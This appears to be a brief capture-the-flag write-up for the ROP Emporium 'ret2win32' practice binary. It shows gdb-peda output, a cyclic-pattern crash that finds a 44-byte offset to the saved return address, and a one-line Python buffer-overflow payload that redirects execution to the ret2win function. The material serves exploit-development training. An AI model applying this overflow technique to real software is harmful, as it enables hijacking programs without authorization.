```
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x08048659  ret2win
0x08048690  __libc_csu_init
0x080486f0  __libc_csu_fini
0x080486f4  _fini
gdb-peda$ quit
```


```
Reading symbols from ret2win32...(no debugging symbols found)...done.
gdb-peda$ pattc 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/ret2win32/ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
```

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffbdf0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb") EBX: 0x0
ECX: 0x0
EDX: 0xf7fa987c --> 0x0
ESI: 0xf7fa8000 --> 0x1b1db0
EDI: 0xf7fa8000 --> 0x1b1db0
EBP: 0x41304141 ('AA0A')
ESP: 0xffffbe20 --> 0xf7fa0062 --> 0x41080ec7
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffbe20 --> 0xf7fa0062 --> 0x41080ec7
0004| 0xffffbe24 --> 0xffffbe40 --> 0x1
0008| 0xffffbe28 --> 0x0
0012| 0xffffbe2c --> 0xf7e0e637 (<__libc_start_main+247>:	add    esp,0x10)
0016| 0xffffbe30 --> 0xf7fa8000 --> 0x1b1db0
0020| 0xffffbe34 --> 0xf7fa8000 --> 0x1b1db0
0024| 0xffffbe38 --> 0x0
0028| 0xffffbe3c --> 0xf7e0e637 (<__libc_start_main+247>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ patto AFAA
AFAA found at offset: 44
gdb-peda$
```

```shell
python -c 'print "A" * 44 + "\x59\x86\x04\x08"' |./ret2win32
```
